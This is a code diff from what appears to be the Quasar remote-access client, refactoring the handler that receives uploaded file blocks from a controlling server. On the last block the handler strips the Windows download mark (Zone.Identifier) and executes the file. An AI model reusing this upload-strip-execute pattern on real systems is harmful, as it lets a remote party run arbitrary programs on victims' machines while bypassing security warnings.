@@ -70,25 +70,25 @@ namespace Quasar.Client.Commands
 
         public static void HandleDoUploadAndExecute(DoUploadAndExecute command, Networking.Client client)
         {
-            if (!_renamedFiles.ContainsKey(command.Id))
-                _renamedFiles.Add(command.Id, FileHelper.GetTempFilePath(Path.GetExtension(command.FileName)));
+            if (!RenamedFiles.ContainsKey(command.Id))
+                RenamedFiles.Add(command.Id, FileHelper.GetTempFilePath(Path.GetExtension(command.FileName)));
 
-            string filePath = _renamedFiles[command.Id];
+            string filePath = RenamedFiles[command.Id];
 
             try
             {
                 if (command.CurrentBlock == 0 && Path.GetExtension(filePath) == ".exe" && !FileHelper.HasExecutableIdentifier(command.Block))
                     throw new Exception("No executable file");
 
-                FileSplit destFile = new FileSplit(filePath);
+                var destFile = new FileSplitLegacy(filePath);
 
                 if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                     throw new Exception(destFile.LastError);
 
                 if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
                 {
-                    if (_renamedFiles.ContainsKey(command.Id))
-                        _renamedFiles.Remove(command.Id);
+                    if (RenamedFiles.ContainsKey(command.Id))
+                        RenamedFiles.Remove(command.Id);
 
                     FileHelper.DeleteZoneIdentifier(filePath);
 
@@ -107,8 +107,8 @@ namespace Quasar.Client.Commands
             }
             catch (Exception ex)
             {
-                if (_renamedFiles.ContainsKey(command.Id))
-                    _renamedFiles.Remove(command.Id);
+                if (RenamedFiles.ContainsKey(command.Id))
+                    RenamedFiles.Remove(command.Id);
                 NativeMethods.DeleteFile(filePath);
 
                 client.Send(new SetStatus {Message = $"Execution failed: {ex.Message}"});
